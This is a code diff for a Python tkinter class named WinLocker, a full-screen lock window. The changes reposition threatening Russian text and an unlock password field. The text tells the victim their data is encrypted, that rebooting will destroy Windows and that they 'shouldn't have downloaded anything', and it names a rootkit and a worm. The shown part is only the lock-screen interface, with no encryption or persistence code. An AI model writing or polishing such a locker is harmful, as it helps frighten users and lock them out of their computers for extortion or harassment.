@@ -73,7 +73,7 @@ class WinLocker:
         self.canvas = tk.Canvas(self.win, bg='black', highlightthickness=0)
         self.canvas.pack(fill='both', expand=True)
         
-        # Страшный текст в левом нижнем углу
+        # Страшный текст слева (растянут по высоте, но не слипается)
         scary_text = (
             "ВАШИ ДАННЫЕ ЗАШИФРОВАНЫ\n"
             "ПЕРЕЗАГРУЗКА ИЛИ ВЫКЛЮЧЕНИЕ ПК = СНОС WINDOWS\n"
@@ -89,9 +89,9 @@ class WinLocker:
             "4. Base64\nNDM1NjM0MjM0\n"
             "5. SHA1\nc93c407d0fb7c60a40b8a2f02b1e4ccf2a9c632d"
         )
-        self.canvas.create_text(50, 550, text=scary_text, fill='white', font=('Courier', 14), anchor='sw')
+        self.canvas.create_text(50, 100, text=scary_text, fill='white', font=('Courier', 14), anchor='nw')
         
-        # Новые угрожающие надписи от DEDSEK (справа)
+        # Текст от DEDSEK справа
         dedsek_text = (
             "DeDsEk тебя приветствует\n"
             "не надо было ничего скачивать\n"
@@ -104,13 +104,13 @@ class WinLocker:
             "- Руткит\n"
             "- Червяк такой жирный"
         )
-        self.canvas.create_text(750, 400, text=dedsek_text, fill='white', font=('Courier', 16), anchor='e')
+        self.canvas.create_text(750, 100, text=dedsek_text, fill='white', font=('Courier', 16), anchor='ne')
         
-        # Поле ввода МАКСИМАЛЬНО СПРАВА И ВНИЗУ
-        self.canvas.create_text(700, 500, text="ВВЕДИТЕ ПАРОЛЬ:", fill='white', font=('Courier', 28), anchor='e')
+        # Поле ввода по центру внизу
+        self.canvas.create_text(400, 450, text="ВВЕДИТЕ ПАРОЛЬ:", fill='white', font=('Courier', 28))
         self.entry = tk.Entry(self.win, show="*", font=('Courier', 28), bg='black', fg='white', insertbackground='white')
-        self.canvas.create_window(700, 540, window=self.entry, anchor='e')
-        self.status = self.canvas.create_text(700, 580, text="", fill='white', font=('Courier', 20), anchor='e')
+        self.canvas.create_window(400, 500, window=self.entry)
+        self.status = self.canvas.create_text(400, 550, text="", fill='white', font=('Courier', 20))
         
         self.entry.bind('<Return>', self.check_password)
         self.entry.focus_set()
